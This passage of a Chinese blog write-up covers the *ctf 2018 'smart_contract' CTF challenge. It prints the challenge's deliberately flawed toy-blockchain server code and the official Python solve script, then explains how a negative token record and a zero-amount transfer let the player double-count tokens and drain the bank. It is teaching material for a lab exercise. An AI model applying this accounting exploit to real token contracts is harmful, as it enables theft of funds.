+def hash_tx(tx):
+    return reduce(hash_reducer, [
+        reduce(hash_reducer, tx[&#39;input&#39;], EMPTY_HASH),
+        reduce(hash_reducer, [utxo[&#39;hash&#39;] for utxo in tx[&#39;output&#39;]], EMPTY_HASH)
+    ])
+
+def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
+    tx = {&#39;input&#39;: input_utxo_ids, &#39;signature&#39;: [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], &#39;output&#39;: output_utxo}
+    tx[&#39;hash&#39;] = hash_tx(tx)
+    return tx
+
+def hash_block(block):
+    return reduce(hash_reducer, [block[&#39;prev&#39;], block[&#39;nonce&#39;], reduce(hash_reducer, [tx[&#39;hash&#39;] for tx in block[&#39;transactions&#39;]], EMPTY_HASH)])
+
+def create_block(prev_block_hash, nonce_str, transactions):
+    if type(prev_block_hash) == type(u&#39;&#39;): prev_block_hash = str(prev_block_hash)
+    if type(prev_block_hash) != type(&#39;&#39;): raise Exception(&#39;prev_block_hash should be hex-encoded hash value&#39;)
+    nonce = str(nonce_str)
+    if len(nonce) &gt; 128: raise Exception(&#39;the nonce is too long&#39;)
+    block = {&#39;prev&#39;: prev_block_hash, &#39;nonce&#39;: nonce, &#39;transactions&#39;: transactions}
+    block[&#39;hash&#39;] = hash_block(block)
+    return block
+
+def find_blockchain_tail(blocks=None):
+    if blocks is None: blocks = session[&#39;blocks&#39;]
+    return max(blocks.values(), key=lambda block: block[&#39;height&#39;])
+
+class SRC20SmartContract:
+    def __init__(self, addr, privkey):
+        self.starTokenNum = 0
+        self.balanceOfAddr = {addr: 999999999}
+        self.addr = addr
+        self.privkey = privkey
+        self.owned_token_utxos = {}
+
+    def onCall_withdraw(self, tx):
+        # by calling this you can convert your StarTokens into StarCoins!
+        if len(tx[&#39;input&#39;]) == 1 and len(tx[&#39;output&#39;]) == 1 and len(tx[&#39;signature&#39;]) == 0 and tx[&#39;input&#39;][0] in self.owned_token_utxos:
+            # which means that you would like to redeem StarCoins in the input utxo using your StarTokens
+            recv_addr = tx[&#39;output&#39;][0][&#39;addr&#39;]
+            amount_to_redeem = self.owned_token_utxos[tx[&#39;input&#39;][0]][&#39;amount&#39;]
+            self.sendTokenAtTx(tx, recv_addr, self.addr, amount_to_redeem)
+            tx[&#39;signature&#39;].append(sign_input_utxo(tx[&#39;input&#39;][0], self.privkey))
+
+    def onCall_buyTokens(self, utxos, tx):
+        # by calling this you can buy some StarTokens using StarCoins!
+        if len(tx[&#39;input&#39;]) == 1 and len(tx[&#39;output&#39;]) == 1 and tx[&#39;output&#39;][0][&#39;addr&#39;] == self.addr:
+            self.sendTokenAtTx(tx, self.addr, utxos[tx[&#39;input&#39;][0]][&#39;addr&#39;], tx[&#39;output&#39;][0][&#39;amount&#39;])
+
+    def getTokenBalance(self, addr):
+        if addr not in self.balanceOfAddr: return 0
+        return self.balanceOfAddr[addr]
+
+    def sendTokenAtTx(self, tx, from_addr, to_addr, amount):
+        if self.getTokenBalance(from_addr) &lt; amount: raise Exception(&quot;no enough StarToken at &quot; + from_addr)
+        if to_addr == self.addr:
+            from_addr, to_addr = to_addr, from_addr
+            amount = -amount
+        utxo_used_to_record_SRCToken = create_output_utxo(to_addr, 0)
+        obj = {&#39;utxo_id&#39;: utxo_used_to_record_SRCToken[&#39;id&#39;], &#39;tokenNum&#39;: amount}
+        payload = json.dumps(obj)
+        signature = self.signSRCTokenUtxoPayload(payload)
+        info = signature + &#39;$$$&#39; + payload
+        utxo_used_to_record_SRCToken[&#39;extra&#39;] = info
+        tx[&#39;output&#39;].append(utxo_used_to_record_SRCToken)
+
+    def signSRCTokenUtxoPayload(self, payload):
+        return rsa.sign(payload, self.privkey, &#39;SHA-1&#39;).encode(&#39;hex&#39;)
+
+    def verifySRCTokenUtxoPayload(self, payload, signature):
+        try:
+            return rsa.verify(payload, signature.decode(&#39;hex&#39;), addr_to_pubkey(self.addr))
+        except:
+            return False
+
+    def extractInfoFromUtxos(self, utxos):
+        for utxo_id, utxo in utxos.items():
+            if &#39;extra&#39; in utxo:
+                info = utxo[&#39;extra&#39;]
+                if type(info) == type(u&#39;&#39;): info = str(info)
+                if type(info) != type(&#39;&#39;): raise Exception(&quot;unknown type of &#39;extra&#39; in utxo&quot;)
+                if &#39;$$$&#39; not in info: raise Exception(&quot;signature of SRC20 token is not found&quot;)
+                signature = info[:info.index(&#39;$$$&#39;)]
+                payload = info[info.index(&#39;$$$&#39;)+3:]
+                if not self.verifySRCTokenUtxoPayload(payload, signature): raise Exception(&quot;this SRC20 token is fake&quot;)
+                obj = json.loads(payload)
+                if obj[&#39;utxo_id&#39;] != utxo[&#39;id&#39;]: raise Exception(&quot;the id of utxo does not match the one on the token&quot;)
+                if utxo[&#39;addr&#39;] not in self.balanceOfAddr: self.balanceOfAddr[utxo[&#39;addr&#39;]] = 0
+                self.balanceOfAddr[utxo[&#39;addr&#39;]] += obj[&#39;tokenNum&#39;]
+            if utxo[&#39;addr&#39;] == self.addr: self.owned_token_utxos[utxo[&#39;id&#39;]] = utxo
+
+
+def calculate_utxo(blockchain_tail):
+    starToken_contract = SRC20SmartContract(bank_address, bank_privkey)
+    curr_block = blockchain_tail
+    blockchain = [curr_block]
+    while curr_block[&#39;hash&#39;] != session[&#39;genesis_block_hash&#39;]:
+        curr_block = session[&#39;blocks&#39;][curr_block[&#39;prev&#39;]]
+        blockchain.append(curr_block)
+    blockchain = blockchain[::-1]
+    utxos = {}
+    for block in blockchain:
+        for tx in block[&#39;transactions&#39;]:
+            for input_utxo_id in tx[&#39;input&#39;]:
+                del utxos[input_utxo_id]
+            for utxo in tx[&#39;output&#39;]:
+                utxos[utxo[&#39;id&#39;]] = utxo
+    starToken_contract.extractInfoFromUtxos(utxos)
+    return utxos, starToken_contract
+
+def calculate_balance(utxos):
+    balance = {bank_address: 0, hacker_address: 0}
+    for utxo in utxos.values():
+        if utxo[&#39;addr&#39;] not in balance:
+            balance[utxo[&#39;addr&#39;]] = 0
+        balance[utxo[&#39;addr&#39;]] += utxo[&#39;amount&#39;]
+    return balance
+
+def verify_utxo_signature(address, utxo_id, signature):
+    try:
+        return rsa.verify(utxo_id, signature.decode(&#39;hex&#39;), addr_to_pubkey(address))
+    except:
+        return False
+
+
+def append_block(block, difficulty=int(&#39;f&#39;*64, 16)):
+    has_attrs(block, [&#39;prev&#39;, &#39;nonce&#39;, &#39;transactions&#39;])
+
+    if type(block[&#39;prev&#39;]) == type(u&#39;&#39;): block[&#39;prev&#39;] = str(block[&#39;prev&#39;])
+    if type(block[&#39;nonce&#39;]) == type(u&#39;&#39;): block[&#39;nonce&#39;] = str(block[&#39;nonce&#39;])
+    if block[&#39;prev&#39;] != find_blockchain_tail()[&#39;hash&#39;]: raise Exception(&quot;You do not have the dominant mining power so you can only submit tx to the last block.&quot;)
+    tail = session[&#39;blocks&#39;][block[&#39;prev&#39;]]
+    utxos, contract = calculate_utxo(tail)
+
+    if type(block[&#39;transactions&#39;]) != type([]): raise Exception(&#39;Please put a transaction array in the block&#39;)
+    new_utxo_ids = set()
+    for tx in block[&#39;transactions&#39;]:
+        has_attrs(tx, [&#39;input&#39;, &#39;output&#39;, &#39;signature&#39;])
+
+        for utxo in tx[&#39;output&#39;]:
+            has_attrs(utxo, [&#39;amount&#39;, &#39;addr&#39;, &#39;id&#39;])
+            if type(utxo[&#39;id&#39;]) == type(u&#39;&#39;): utxo[&#39;id&#39;] = str(utxo[&#39;id&#39;])
+            if type(utxo[&#39;addr&#39;]) == type(u&#39;&#39;): utxo[&#39;addr&#39;] = str(utxo[&#39;addr&#39;])
+            if type(utxo[&#39;id&#39;]) != type(&#39;&#39;): raise Exception(&quot;unknown type of id of output utxo&quot;)
+            if utxo[&#39;id&#39;] in new_utxo_ids: raise Exception(&quot;output utxo of same id({}) already exists.&quot;.format(utxo[&#39;id&#39;]))
+            new_utxo_ids.add(utxo[&#39;id&#39;])
+            if type(utxo[&#39;amount&#39;]) != type(1): raise Exception(&quot;unknown type of amount of output utxo&quot;)
+            if utxo[&#39;amount&#39;] &lt; 0: raise Exception(&quot;invalid amount of output utxo&quot;)
+            if type(utxo[&#39;addr&#39;]) != type(&#39;&#39;): raise Exception(&quot;unknown type of address of output utxo&quot;)
+            try:
+                addr_to_pubkey(utxo[&#39;addr&#39;])
+            except:
+                raise Exception(&quot;invalid type of address({})&quot;.format(utxo[&#39;addr&#39;]))
+            utxo[&#39;hash&#39;] = hash_utxo(utxo)
+
+        for new_id in new_utxo_ids:
+            if new_id in utxos:
+                raise Exception(&quot;invalid id of output utxo. utxo id({}) exists&quot;.format(utxo_id))
+
+        if type(tx[&#39;input&#39;]) != type([]): raise Exception(&quot;type of input utxo ids in tx should be array&quot;)
+        if type(tx[&#39;signature&#39;]) != type([]): raise Exception(&quot;type of input utxo signatures in tx should be array&quot;)
+
+        tx[&#39;input&#39;] = [str(i) if type(i) == type(u&#39;&#39;) else i for i in tx[&#39;input&#39;]]
+        for utxo_id in tx[&#39;input&#39;]:
+            if type(utxo_id) != type(&#39;&#39;): raise Exception(&quot;unknown type of id of input utxo&quot;)
+            if utxo_id not in utxos: raise Exception(&quot;invalid id of input utxo. Input utxo({}) does not exist or it has been consumed.&quot;.format(utxo_id))
+
+        if contract is not None:
+            if &#39;call_smart_contract&#39; in tx:
+                if tx[&#39;call_smart_contract&#39;] == &#39;buyTokens&#39;: contract.onCall_buyTokens(utxos, tx)
+                if tx[&#39;call_smart_contract&#39;] == &#39;withdraw&#39;: contract.onCall_withdraw(tx)
+
+        tot_input = 0
+        if len(tx[&#39;input&#39;]) != len(tx[&#39;signature&#39;]): raise Exception(&quot;lengths of arrays of ids and signatures of input utxos should be the same&quot;)
+        tx[&#39;signature&#39;] = [str(i) if type(i) == type(u&#39;&#39;) else i for i in tx[&#39;signature&#39;]]
+        for utxo_id, signature in zip(tx[&#39;input&#39;], tx[&#39;signature&#39;]):
+            utxo = utxos[utxo_id]
+            if type(signature) != type(&#39;&#39;): raise Exception(&quot;unknown type of signature of input utxo&quot;)
+            if not verify_utxo_signature(utxo[&#39;addr&#39;], utxo_id, signature):
+                raise Exception(&quot;Signature of input utxo is not valid. You are not the owner of this input utxo({})!&quot;.format(utxo_id))
+            tot_input += utxo[&#39;amount&#39;]
+            del utxos[utxo_id]
+
+        tot_output = sum([utxo[&#39;amount&#39;] for utxo in tx[&#39;output&#39;]])
+        if tot_output &gt; tot_input:
+            raise Exception(&quot;You don&#39;t have enough amount of StarCoins in the input utxo! {}/{}&quot;.format(tot_input, tot_output))
+        tx[&#39;hash&#39;] = hash_tx(tx)
+
+    block = create_block(block[&#39;prev&#39;], block[&#39;nonce&#39;], block[&#39;transactions&#39;])
+    block_hash = int(block[&#39;hash&#39;], 16)
+    #We are users in this challenge, so leave the Proof-of-Work thing to the non-existent miners
+    #if block_hash &gt; difficulty: raise Exception(&#39;Please provide a valid Proof-of-Work&#39;)
+    block[&#39;height&#39;] = tail[&#39;height&#39;]+1
+    if len(session[&#39;blocks&#39;]) &gt; 10: raise Exception(&#39;The blockchain is too long. Use ./reset to reset the blockchain&#39;)
+    if block[&#39;hash&#39;] in session[&#39;blocks&#39;]: raise Exception(&#39;A same block is already in the blockchain&#39;)
+    session[&#39;blocks&#39;][block[&#39;hash&#39;]] = block
+    session.modified = True
+
+def init():
+    if &#39;blocks&#39; not in session:
+        session[&#39;blocks&#39;] = {}
+
+        # At first, the bank issued some StarCoins, and give you 100
+        currency_issued = create_output_utxo(bank_address, 200)
+        airdrop = create_output_utxo(hacker_address, 100)
+        genesis_transaction = create_tx([], [currency_issued, airdrop]) # create StarCoins from nothing
+        genesis_block = create_block(EMPTY_HASH, &#39;The Times 03/Jan/2009 Chancellor on brink of second bailout for bank&#39;, [genesis_transaction])
+
+        session[&#39;genesis_block_hash&#39;] = genesis_block[&#39;hash&#39;]
+        genesis_block[&#39;height&#39;] = 0
+        session[&#39;blocks&#39;][genesis_block[&#39;hash&#39;]] = genesis_block
+
+
+def get_balance_of_all():
+    init()
+    tail = find_blockchain_tail()
+    utxos, contract = calculate_utxo(tail)
+    return calculate_balance(utxos), utxos, tail, contract
+
+@app.route(url_prefix+&#39;/&#39;)
+def homepage():
+    announcement = &#39;&#39;
+    balance, utxos, _, contract = get_balance_of_all()
+    genesis_block_info = &#39;hash of genesis block: &#39; + session[&#39;genesis_block_hash&#39;]
+    addr_info = &#39;the bank\&#39;s addr: &#39; + bank_address + &#39;, your addr: &#39; + hacker_address + &#39;, your privkey: &#39; + pickle.dumps(hacker_privkey).encode(&#39;hex&#39;)
+    balance_info = &#39;StarCoins balance of all addresses: &#39; + json.dumps(balance)
+    starcoins_utxo_info = &#39;All utxos: &#39; + json.dumps(utxos)
+    startokens_info = &#39;StarTokens balance of all addresses: &#39; + json.dumps(contract.balanceOfAddr)
+    blockchain_info = &#39;Blockchain Explorer: &#39; + json.dumps(session[&#39;blocks&#39;])
+    view_source_code_link = &quot;&lt;a href=&#39;source_code&#39;&gt;View source code&lt;/a&gt;&quot;
+    return announcement+(&#39;.&lt;br /&gt;&lt;br /&gt;\r\n\r\n&#39;.join([view_source_code_link, genesis_block_info, addr_info, balance_info, starcoins_utxo_info, startokens_info, blockchain_info]))
+
+
+DIFFICULTY = int(&#39;00000&#39; + &#39;f&#39; * 59, 16)
+@app.route(url_prefix+&#39;/create_block&#39;, methods=[&#39;POST&#39;])
+def create_block_api():
+    init()
+    try:
+        block = json.loads(request.data)
+        append_block(block, DIFFICULTY)
+        msg = &#39;transaction finished.&#39;
+    except Exception, e:
+        return str(e)
+
+    balance, utxos, tail, contract = get_balance_of_all()
+
+    if balance[hacker_address] == 200:
+        msg += &#39; Congratulations~ &#39; + FLAG()
+    return msg
+
+
+# if you mess up the blockchain, use this to reset the blockchain.
+@app.route(url_prefix+&#39;/reset&#39;)
+def reset_blockchain():
+    if &#39;blocks&#39; in session: del session[&#39;blocks&#39;]
+    if &#39;genesis_block_hash&#39; in session: del session[&#39;genesis_block_hash&#39;]
+    return &#39;reset.&#39;
+
+@app.route(url_prefix+&#39;/source_code&#39;)
+def show_source_code():
+    source = open(&#39;serve.py&#39;, &#39;r&#39;)
+    html = &#39;&#39;
+    for line in source:
+        line = line.decode(&#39;utf8&#39;, &#39;ignore&#39;)
+        html += line.replace(&#39;&amp;&#39;,&#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(&#39; &#39;,&#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;)
+    source.close()
+    return html
+
+if __name__ == &#39;__main__&#39;:
+    app.run(debug=False, host=&#39;0.0.0.0&#39;, port=10012)</code></pre>
+<p>这道题目是从ddctf2018的区块链处改编的，由于不熟区块链和智能合约，看了好久，还是没真正看懂智能合约部分，所以，Orz。</p>
+<p>良心的官方给了解答</p>
+<p><a href="https://github.com/sixstars/starctf2018/tree/master/web-smart_contract" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/web-smart_contract</a></p>
+<pre><code class="python"># -*- encoding: utf-8 -*-
+# written in python 2.7
+__author__ = &#39;garzon&#39;
+
+import requests, json, hashlib, rsa, pickle, uuid
+
+from server import *
+
+# do some modifications to the original one to remove &#39;session&#39; variable and privkey
+def calculate_utxo(blocks, bankAddr, blockchain_tail):
+    starToken_contract = SRC20SmartContract(bankAddr, 0)
+    curr_block = blockchain_tail
+    blockchain = [curr_block]
+    while curr_block[&#39;height&#39;] != 0:
+        curr_block = blocks[curr_block[&#39;prev&#39;]]
+        blockchain.append(curr_block)
+    blockchain = blockchain[::-1]
+    utxos = {}
+    for block in blockchain:
+        for tx in block[&#39;transactions&#39;]:
+            for input_utxo_id in tx[&#39;input&#39;]:
+                del utxos[input_utxo_id]
+            for utxo in tx[&#39;output&#39;]:
+                utxos[utxo[&#39;id&#39;]] = utxo
+    starToken_contract.extractInfoFromUtxos(utxos)
+    print &#39;utxos = {&#39;
+    for utxo in utxos:
+        print  json.dumps(utxo) + &#39; : \n\t&#39; + json.dumps(utxos[utxo])
+    print &#39;}&#39;
+    return utxos, starToken_contract
+
+# ==============
+
+def create_output_utxo(addr_to, amount):
+    utxo = {&#39;id&#39;: str(uuid.uuid4()), &#39;addr&#39;: addr_to, &#39;amount&#39;: amount}
+    utxo[&#39;hash&#39;] = hash_utxo(utxo)
+    return utxo
+
+def find_inner_str(haystack, st, ed=None):
+    haystack = haystack[haystack.index(st)+len(st):]
+    if ed is None: return haystack
+    return haystack[:haystack.index(ed)]
+
+def append_block(block):
+    print &quot;block = \n\t&quot; + json.dumps(block)
+    print &#39;[APPEND]&#39;, s.post(url_prefix+&#39;/create_block&#39;, data=json.dumps(block),proxies=proxies).text
+    print &quot;\n\n&quot;
+
+is_first_time = True
+def show_blockchain():
+    global is_first_time
+    ret = s.get(url_prefix+&#39;/&#39;,proxies=proxies).text
+    #print ret.replace(&#39;&lt;br /&gt;&#39;,&#39;&#39;)
+    tokens = json.loads(find_inner_str(ret, &#39;StarTokens balance of all addresses: &#39;, &#39;.&#39;))
+    balance = json.loads(find_inner_str(ret, &#39;StarCoins balance of all addresses: &#39;, &#39;.&#39;))
+    print &#39;tokens = &#39; + json.dumps(tokens)
+    print &#39;balance = &#39; + json.dumps(balance)
+    if not is_first_time:
+        print &#39;[tokens = {}, balance = {}]&#39;.format(tokens.get(my_address, 0), balance[my_address])
+    is_first_time = False
+    print &#39;block trains = \n\t&#39; + find_inner_str(ret, &#39;Blockchain Explorer: &#39;)
+    return ret, json.loads(find_inner_str(ret, &#39;Blockchain Explorer: &#39;))
+
+def redeem(bank_owned_utxo_id, tail, amount, nonce):
+    output_to_get_starcoins = create_output_utxo(my_address, amount)
+    tx = create_tx([bank_owned_utxo_id], [output_to_get_starcoins], my_privkey) # my_privkey is dummy, the signature will be overwritten
+    tx[&#39;signature&#39;] = [] # remains the field to be filled by smart contract
+    tx[&#39;call_smart_contract&#39;] = &#39;withdraw&#39;
+    block = create_block(tail[&#39;hash&#39;], nonce, [tx])
+    append_block(block)
+    return output_to_get_starcoins
+
+def buyTokens(utxoIdPaid, tail, amount, contractAddr, nonce):
+    output_to_get_tokens = create_output_utxo(contractAddr, amount)
+    tx = create_tx([utxoIdPaid], [output_to_get_tokens], my_privkey)
+    tx[&#39;call_smart_contract&#39;] = &#39;buyTokens&#39;
+    block = create_block(tail[&#39;hash&#39;], nonce, [tx])
+    append_block(block)
+    return output_to_get_tokens
+
+url_prefix = &#39;http://127.0.0.1:10012/6af948d659f0b7c5d3950a&#39;
+proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}
+s = requests.session()
+
+# 100 starcoins
+resp, blocks = show_blockchain()
+my_address, my_privkey = find_inner_str(resp, &#39;your addr: &#39;, &#39;,&#39;), pickle.loads(find_inner_str(resp, &#39;your privkey: &#39;, &#39;.&#39;).decode(&#39;hex&#39;))
+bankAddr = find_inner_str(resp, &#39;the bank\&#39;s addr: &#39;, &#39;,&#39;)
+
+tail = find_blockchain_tail(blocks)
+utxos, contract = calculate_utxo(blocks, bankAddr, tail)
+for utxo in utxos.values():
+    if utxo[&#39;addr&#39;] == my_address: my_utxo = utxo # find the utxo of 100 starcoins 
+    if utxo[&#39;addr&#39;] == bankAddr: coinsIssued = utxo
+first100TokenBankOwned = buyTokens(my_utxo[&#39;id&#39;], tail, 100, contract.addr, &#39;step1&#39;)
+
+# 100 tokens
+resp, blocks = show_blockchain()
+tail = find_blockchain_tail(blocks)
+utxos, contract = calculate_utxo(blocks, bankAddr, tail)
+for utxo in utxos.values():
+    if utxo[&#39;addr&#39;] == my_address:
+        break
+my_first_100_tokens_utxo_id = utxo[&#39;id&#39;]
+my_100_starcoins = redeem(first100TokenBankOwned[&#39;id&#39;], tail, 100, &#39;step2&#39;)
+
+# 100 starcoins, 100 - 100 tokens
+resp, blocks = show_blockchain()
+tail = find_blockchain_tail(blocks)
+utxos, contract = calculate_utxo(blocks, bankAddr, tail)
+for utxo in utxos.values():
+    if utxo[&#39;addr&#39;] == my_address and utxo[&#39;id&#39;] != my_first_100_tokens_utxo_id and utxo[&#39;amount&#39;] == 0:
+        break # find the utxo of -100 tokens
+output_to_send_minus_100_token = create_output_utxo(bankAddr, 0)
+tx = create_tx([utxo[&#39;id&#39;]], [output_to_send_minus_100_token], my_privkey)
+block = create_block(tail[&#39;hash&#39;], &#39;step3&#39;, [tx])
+append_block(block)
+
+# 100 starcoins, 100 tokens, but the bank now just own a utxo of 200 starcoins, we need 200 tokens to redeem that utxo
+resp, blocks = show_blockchain()
+tail = find_blockchain_tail(blocks)
+buyTokens(my_100_starcoins[&#39;id&#39;], tail, 100, contract.addr, &#39;step4&#39;)
+
+# 200 tokens to exchange the utxo of 200 starcoins owned by the bank initially
+resp, blocks = show_blockchain()
+tail = find_blockchain_tail(blocks)
+redeem(coinsIssued[&#39;id&#39;], tail, 200, &#39;step5&#39;)</code></pre>
+<p>所以，这道题目的分析，准备从分析答案开始，回过头来分析源代码。</p>
+<h4 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h4><p>首先，直接看答案源代码还是比较晕的，毕竟不知道他在干啥。</p>
+<p>所以，我们先来加些log，看看整个获得flag的流程是怎样的。</p>
+<p><img src="/img/starctf/1524491349.png" alt=""></p>
+<p>用自己的钱，正常购买100token。</p>
+<p><img src="/img/starctf/1524491525.png" alt=""></p>
+<p>看起来像是正常提取100token，注意，要从不是tokenNum为100这里提取，这样提取后会有个tokenNum为-100的</p>
+<p><img src="/img/starctf/1524491617.png" alt=""></p>
+<p>注意到回到了tokens为0(100 + -100 = 0)，balance为100的局面，仿佛一切回到了原点，</p>
+<p>哦？是吗</p>
+<p><img src="/img/starctf/1524491899.png" alt=""></p>
+<p>这是我们的地址，从这里转0个币（amount = 0）到银行，</p>
+<p>这里就导致了一个不守恒，原则上，应该对于一个区块来说，input和output的总额应该是相等的，但是，由于这里将token储存在到<code>extra</code>数据域中，那么这个<code>tokenNum=-100</code>就会因这次的操作而消失(导致了所谓的不守恒)，即不会参与到后面的计算中，那么账户中多了100个token。</p>
+<p>即，原来的<code>utxos</code>中包括了两个存有<code>extra</code>数据的<code>utxo</code>，分别记录了<code>tokenNum=100</code>和<code>tokenNum=-100</code>，计算你的<code>tokens</code>值时，会将他们求总和，即<code>100 + -100 = 0</code>。</p>
+<p>后面，我们通过转账0个币给银行，导致存储着<code>tokenNum = -100</code>的<code>utxo</code>被使用了，其中存储的<code>tokenNum = -100</code>也就不会再参与计算你的<code>tokens</code>值，那么，计算你的<code>tokens</code>时，求总和，即<code>100 = 100</code>，此时，你的tokens为100。</p>
+<p><img src="/img/starctf/1524492049.png" alt=""></p>
+<p>嗯，然后进行正常的操作将tokens转成balance即可</p>
+<p><img src="/img/starctf/1524492258.png" alt=""></p>
+<p><img src="/img/starctf/1524492295.png" alt=""></p>
+<p>这样下来，整个流程我们就清楚啦。</p>
+<h4 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h4><p>首先分析，整个-100是怎么产生的，</p>
+<p><img src="/img/starctf/1524493465.png" alt=""></p>
+<p>在withdraw时，这里<code>amount = -amount</code> ，这是什么操作？意义是？当时看到这里我就一直在迷。</p>
+<p>再来看，当<code>tokenNum</code>为-100时，转账<code>amount = 0</code>时，导致我们tokens增加100。</p>
+<p><img src="/img/starctf/1524497481.png" alt=""></p>
+<p>被引用过的就不会加入到<code>utxo</code>的计算中了。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至3213359017@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry"><span class="miit">
+                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
+                <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">粤ICP备19027389号</a>
+        </span>
+    
+    ©2015-2020 UltramanGaia
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
